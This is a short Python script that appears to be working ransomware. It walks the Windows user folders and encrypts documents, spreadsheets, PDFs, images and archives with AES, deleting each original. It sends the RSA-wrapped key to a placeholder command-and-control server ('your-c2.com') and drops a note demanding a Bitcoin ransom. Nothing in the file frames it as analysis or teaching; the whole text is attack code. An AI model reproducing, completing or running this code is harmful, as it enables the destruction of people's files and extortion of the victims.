import os, glob, requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

RSA_PUBLIC = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
key = RSA.import_key(RSA_PUBLIC)
cipher_rsa = PKCS1_OAEP.new(key)
aes_key = get_random_bytes(32)

def encrypt_file(path):
    iv = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    with open(path, "rb") as f: data = f.read()
    ct, tag = cipher.encrypt_and_digest(data)
    with open(path + ".enc", "wb") as f:
        f.write(iv + tag + ct)
    os.remove(path)

for root, _, files in os.walk("C:\\Users\\"):
    for f in files:
        if f.endswith((".docx", ".xlsx", ".pdf", ".jpg", ".zip")):
            encrypt_file(os.path.join(root, f))

# Send encrypted AES key to C2
enc_aes = cipher_rsa.encrypt(aes_key)
requests.post("https://your-c2.com/key", data=enc_aes)

# Ransom note
with open("READ_ME.txt", "w") as f:
    f.write("Your files encrypted. Pay 0.5 BTC to oX... Contact via Tor.")